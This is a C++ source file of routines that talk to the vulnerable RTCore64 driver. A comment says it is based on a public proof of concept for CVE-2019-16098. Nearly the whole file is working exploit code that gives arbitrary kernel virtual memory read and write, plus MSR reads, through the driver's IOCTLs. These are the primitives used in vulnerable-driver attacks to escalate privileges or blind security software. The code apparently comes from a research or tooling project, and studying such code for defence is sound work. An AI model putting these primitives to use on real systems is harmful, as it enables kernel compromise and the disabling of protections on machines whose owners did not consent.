/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       RTCORE.CPP
*
*  VERSION:     1.10
*
*  DATE:        15 Apr 2021
*
*  RTCORE64 driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/rtcore.h"

//
// Based on https://github.com/Barakat/CVE-2019-16098
//

/*
* RTCoreCallDriver
*
* Purpose:
*
* Call RTCore driver.
*
*/
BOOL RTCoreCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID Buffer,
    _In_ ULONG Size)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        Buffer,
        Size,
        Buffer,
        Size);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

/*
* RTCoreReadMSR
*
* Purpose:
*
* Read given msr.
*
*/
BOOL WINAPI RTCoreReadMsr(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG Msr,
    _Out_ ULONG64* Value
)
{
    RTCORE_MSR request;

    *Value = 0;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Register = Msr;

    if (!RTCoreCallDriver(DeviceHandle,
        IOCTL_RTCORE_READMSR,
        &request,
        sizeof(request)))
    {
        return FALSE;
    }

    *Value = (request.ValueLow & 0xfffff000ul) | ((ULONG64)request.ValueHigh << 32);

    return TRUE;
}

/*
* RTCoreReadMemoryPrimitive
*
* Purpose:
*
* Basic read primitive, reads 4 bytes at once.
*
*/
BOOL RTCoreReadMemoryPrimitive(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG Size,
    _In_ ULONG_PTR Address,
    _Out_ ULONG* Value)
{
    RTCORE_REQUEST request;

    *Value = 0;

    if ((Size != sizeof(WORD)) &&
        (Size != sizeof(ULONG)))
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Address = Address;
    request.Size = Size;

    if (RTCoreCallDriver(DeviceHandle,
        IOCTL_RTCORE_READVM,
        &request,
        sizeof(RTCORE_REQUEST)))
    {
        *Value = request.Value;
        return TRUE;
    }

    return FALSE;
}

/*
* RTCoreWriteMemoryPrimitive
*
* Purpose:
*
* Basic write primitive, writes 4 bytes at once.
*
*/
BOOL RTCoreWriteMemoryPrimitive(
    _In_ HANDLE DeviceHandle,
    _In_ DWORD Size,
    _In_ ULONG_PTR Address,
    _In_ ULONG Value)
{
    RTCORE_REQUEST request;

    if ((Size != sizeof(WORD)) &&
        (Size != sizeof(ULONG)))
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Address = Address;
    request.Size = Size;
    request.Value = Value;

    return RTCoreCallDriver(DeviceHandle,
        IOCTL_RTCORE_WRITEVM,
        &request,
        sizeof(RTCORE_REQUEST));
}

/*
* RTCoreReadMemoryULONG
*
* Purpose:
*
* Read ULONG from kernel.
*
*/
BOOL RTCoreReadMemoryULONG(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_ ULONG* Value)
{
    ULONG valueRead = 0;

    *Value = 0;

    if (RTCoreReadMemoryPrimitive(DeviceHandle,
        sizeof(ULONG),
        Address,
        &valueRead))
    {
        *Value = valueRead;
        return TRUE;
    }

    return FALSE;
}

/*
* RTCoreReadMemoryULONG64
*
* Purpose:
*
* Read ULONG64 from kernel.
*
*/
BOOL RTCoreReadMemoryULONG64(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_ ULONG64* Value)
{
    ULONG valueLow = 0, valueHigh = 0;

    *Value = 0;

    if (!RTCoreReadMemoryULONG(DeviceHandle,
        Address + sizeof(ULONG),
        &valueHigh))
    {
        return FALSE;
    }

    if (!RTCoreReadMemoryULONG(DeviceHandle,
        Address,
        &valueLow))
    {
        return FALSE;
    }

    *Value = ((ULONG64)valueHigh << 32) | valueLow;

    return TRUE;
}

/*
* RTCoreWriteMemoryULONG
*
* Purpose:
*
* Write ULONG to kernel.
*
*/
BOOL RTCoreWriteMemoryULONG(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ ULONG Value
)
{
    return RTCoreWriteMemoryPrimitive(DeviceHandle,
        sizeof(ULONG),
        Address,
        Value);
}

/*
* RTCoreWriteMemoryULONG64
*
* Purpose:
*
* Write ULONG64 to kernel.
*
*/
BOOL RTCoreWriteMemoryULONG64(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ ULONG64 Value)
{
    if (RTCoreWriteMemoryPrimitive(DeviceHandle,
        sizeof(ULONG),
        Address,
        Value & 0xfffffffful))
    {
        return RTCoreWriteMemoryPrimitive(DeviceHandle,
            sizeof(ULONG),
            Address + sizeof(ULONG),
            Value >> 32);
    }

    return FALSE;
}

/*
* RTCoreReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via RTCore64.
* Input buffer length must be aligned to ULONG
*
*/
_Success_(return != FALSE)
BOOL WINAPI RTCoreReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    if ((NumberOfBytes % sizeof(ULONG)) != 0)
        return FALSE;

    PULONG BufferPtr = (PULONG)Buffer;

    ULONG_PTR virtAddress = VirtualAddress;
    ULONG valueRead, readBytes = 0;

    for (ULONG i = 0; i < (NumberOfBytes / sizeof(ULONG)); i++) {

        if (!RTCoreReadMemoryULONG(DeviceHandle, virtAddress, &valueRead))
            break;

        BufferPtr[i] = valueRead;
        virtAddress += sizeof(ULONG);
        readBytes += sizeof(ULONG);
    }

    return (readBytes == NumberOfBytes);
}

/*
* RTCoreWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via RTCore64.
* Input buffer length must be aligned to ULONG
*
*/
_Success_(return != FALSE)
BOOL WINAPI RTCoreWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    if ((NumberOfBytes % sizeof(ULONG)) != 0)
        return FALSE;

    PULONG BufferPtr = (PULONG)Buffer;

    ULONG_PTR virtAddress = VirtualAddress;
    ULONG valueWrite, writeBytes = 0;

    for (ULONG i = 0; i < (NumberOfBytes / sizeof(ULONG)); i++) {

        valueWrite = BufferPtr[i];
        if (!RTCoreWriteMemoryULONG(DeviceHandle, virtAddress, valueWrite))
            break;

        virtAddress += sizeof(ULONG);
        writeBytes += sizeof(ULONG);
    }

    return (writeBytes == NumberOfBytes);
}
